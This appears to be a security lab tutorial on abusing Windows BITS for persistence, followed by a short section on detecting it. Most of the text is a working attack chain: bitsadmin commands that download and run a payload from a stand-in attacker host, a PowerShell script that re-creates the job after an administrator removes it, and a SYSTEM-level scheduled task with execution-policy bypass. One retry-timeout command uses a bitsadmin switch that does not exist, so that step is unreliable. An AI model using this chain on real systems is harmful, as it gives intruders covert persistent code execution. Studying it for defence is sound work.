# BITS Persistence and Monitoring Lab

## 1. Introduction

### Overview of BITS
The Background Intelligent Transfer Service (BITS) is a built-in Windows component designed to asynchronously transfer files (downloads and uploads) between a machine and a remote server using idle network bandwidth. It intelligently manages transfers during network interruptions or system reboots.

### Attacker Abuse & Stealth
Attackers abuse BITS for persistence and covert command-and-control (C2) operations because it operates as a legitimate system service (`qmgr.service`), often bypassing standard firewall restrictions by blending in with normal update traffic. Furthermore, BITS jobs can persist across system reboots and run under the system context.

---

## 2. Understanding BITS and Its Capabilities

### How BITS Functions
BITS uses foreground and background priorities to throttle bandwidth. It relies on jobs and files within those jobs, executing tasks even when the user is logged out (depending on the configuration).

### Why Attackers Prefer It
* **Native Living-Off-the-Land (LotL) Binary:** Utilizes built-in tools like `bitsadmin.exe` or the PowerShell `BitsTransfer` module.
* **Built-in Persistence:** Jobs resume automatically after system reboots.
* **Command Execution:** Can execute an application upon completion using the `/SetNotifyCmdLine` parameter.

---

## 3. Creating a Malicious BITS Job

Using the native **BITSAdmin** command-line tool, you can create, configure, and execute a download job that triggers a payload upon completion.

### Step 1: Create a new BITS job
Open an elevated Command Prompt and create a download job named `SecurityUpdate`:
```cmd
bitsadmin /create /download SecurityUpdate
```

### Step 2: Add a file to the job
Specify the remote URL (attacker-controlled server or test payload) and the local destination path:
```cmd
bitsadmin /addfile SecurityUpdate http://<ATTACKER_IP>/payload.exe C:\Users\Public\payload.exe
```

### Step 3: Configure execution upon completion (Notify Command)
Configure BITS to execute the payload automatically once the file transfer successfully finishes:
```cmd
bitsadmin /setnotifycmdline SecurityUpdate C:\Users\Public\payload.exe NULL
```
*(Note: The second parameter is the command line arguments passed to the executable, and `NULL` can be passed if none are needed).*

### Step 4: Set retry parameters for resilience
Configure retry delays and error handling intervals:
```cmd
bitsadmin /setrestittimeout SecurityUpdate 60
bitsadmin /setretrydelay SecurityUpdate 30
```

### Step 5: Resume and execute the job
By default, newly created jobs are suspended. You must activate them:
```cmd
bitsadmin /resume SecurityUpdate
```

---

## 4. Implementing a Persistence Mechanism

To ensure the BITS job is re-created or monitored if an administrator cleans it up, you can deploy a PowerShell checker script and bind it to a Scheduled Task.

### PowerShell Checker Script (`check_bits.ps1`)
Save the following script to `C:\Scripts\check_bits.ps1`:

```powershell
$JobName = "SecurityUpdate"
$JobUrl = "http://<ATTACKER_IP>/payload.exe"
$LocalPath = "C:\Users\Public\payload.exe"

# Check if the BITS job exists
$ExistingJob = Get-BitsTransfer -Name $JobName -ErrorAction SilentlyContinue

if (-not $ExistingJob) {
    Write-Host "[*] BITS job removed or missing. Re-creating..."
    
    # Re-create the transfer job
    Start-BitsTransfer -Asynchronous -DisplayName $JobName -Source $JobUrl -Destination $LocalPath -Priority Normal
    
    # Re-apply execution hook via bitsadmin or native PowerShell handling
    cmd.exe /c "bitsadmin /setnotifycmdline $JobName $LocalPath NULL"
    
    # Resume the job
    $NewJob = Get-BitsTransfer -Name $JobName
    Resume-BitsTransfer -BitsJob $NewJob
} else {
    Write-Host "[+] BITS job is active."
}
```

### Automating with Scheduled Tasks
Create a scheduled task that executes this script periodically (e.g., every 30 minutes) or at system startup:
```cmd
schtasks /create /tn "BITS_Monitor" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Scripts\check_bits.ps1" /sc minute /mo 30 /ru SYSTEM
```

---

## 5. Detecting and Preventing Malicious BITS Jobs

Blue teams can hunt for and mitigate malicious BITS usage through logs and native configurations:

### Windows Event Logs
* **Microsoft-Windows-Bits-Client/Operational:** Look for Event ID **59** (job creation), **60** (job modification), and **61** (job completion). Pay attention to unexpected executable paths spawned via notification commands.
* **Security Event Log (Event ID 4688):** Look for command-line arguments involving `bitsadmin.exe /create`, `/addfile`, or `/setnotifycmdline`.

### Enumeration Command (DFIR / Hunting)
```cmd
bitsadmin /list /allusers /verbose
```
Or via PowerShell:
```powershell
Get-BitsTransfer -AllUsers | Select-Object DisplayName, JobState, Files
```

### Defense & Mitigation
* Monitor and audit execution of `bitsadmin.exe`.
* Restrict outbound traffic to known-good endpoints via firewalls.
* Implement Application Control (Windows Defender Application Control / AppLocker) to block unauthorized binaries executing from paths like `C:\Users\Public\`.

---

## 6. Conclusion

### Summary of the Attack Method
BITS provides a covert, resilient mechanism for attackers to download payloads and establish persistent access by masquerading as standard administrative activity.

### Best Practices for Defense & Mitigation
Continuous monitoring of BITS administrative queues, auditing Event Logs for unauthorized notification command executions, and enforcing strict endpoint hardening significantly reduce the risk of BITS-based persistence.
